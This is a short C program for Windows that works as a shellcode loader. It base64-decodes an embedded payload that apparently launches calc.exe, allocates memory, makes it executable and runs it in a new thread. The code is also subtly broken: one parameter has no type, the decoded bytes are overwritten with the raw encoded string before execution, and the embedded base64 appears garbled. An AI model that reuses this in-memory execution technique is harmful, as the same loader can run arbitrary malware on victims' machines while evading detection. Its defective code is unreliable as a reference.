#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <Wincrypt.h>
#pragma comment (lib, "Crypt32.lib")


int DecodeBase64(const BYTE * src, unsigned int srcLen, const dst, unsigned int dstLen){
	
	DWORD outLen;
	BOOL fRet;
	
	outLen = dstLen; // se hace esto porque CryptStringToBinary necesita un DWORD con el tama√±o
	fRet = CryptStringToBinary((LPCSTR) src, srcLen, CRYPT_STRING_BASE64, (BYTE *) dst, &outLen, NULL, NULL );
	if(!fRet){outLen = 0;}
	return (outLen);
	
}



int main(void){

	void * exec_mem;
	BOOL rv; 
	HANDLE th; // define a HANDLE
	DWORD oldprotect = 0;
	
	
	unsigned char payload [] = "w7xIxpLDpMOww6jDgCAgIEFRQVBSUVZIMcOSZUjigLlSYEjigLlSGEjigLlSIEjigLlyUEgPwrdKSk0xw4lIMcOAwqw8YXwCLCBBw4HDiQ0KQQHDgcOiw61SQVFI4oC5UiDigLlCPEgBw5DigLnigqzLhiAgIEjigKbDgHRnSAHDkFDigLlIGETigLlAIEkBw5DDo1ZIw7/DiUHigLk0y4ZIAcOWTTHDiUgxw4DCrEHDgcOJDQpBAcOBOMOgdcOxTANMJAhFOcORdcOYWETigLlAJEkBw5BmQeKAuQxIROKAuUAcSQHDkEHigLkEy4ZIAcOQQVhBWF5ZWkFYQVlBWkjGksOsIEFSw7/DoFhBWVpI4oC5EsOpV8O/w7/Dv11IwroBICAgICAgIEjCjcKNAQEgIEHCujHigLlv4oChw7/DlcK7w7DCtcKiVkHCusKm4oCiwr3CncO/w5VIxpLDhCg8BnwNCuKCrMO7w6B1BcK7RxNyb2ogWUHigLDDmsO/w5VDOlx3aW5kb3dzXHN5c3RlbTMyXGNhbGMuZXhl";
	unsigned int payload_size = sizeof(payload);
	
	
	
	exec_mem = VirtualAlloc(0, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	

	// before we move our payload to memory, we need to base64 decode it 
	
	DecodeBase64(&payload, payload_size, (char *) exec_mem, payload_size );
	
	RtlMoveMemory(exec_mem, payload, payload_size);

	
	rv = VirtualProtect(exec_mem, payload_size, PAGE_EXECUTE_READ, &oldprotect);
	printf("Allocated memory is now executable!");
	
	getchar();
	
	if (rv != 0){ // function succeeds
		
		DWORD threadId;
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, &threadId);
		getchar();
		WaitForSingleObject(th, -1);
}

	return 0;

}
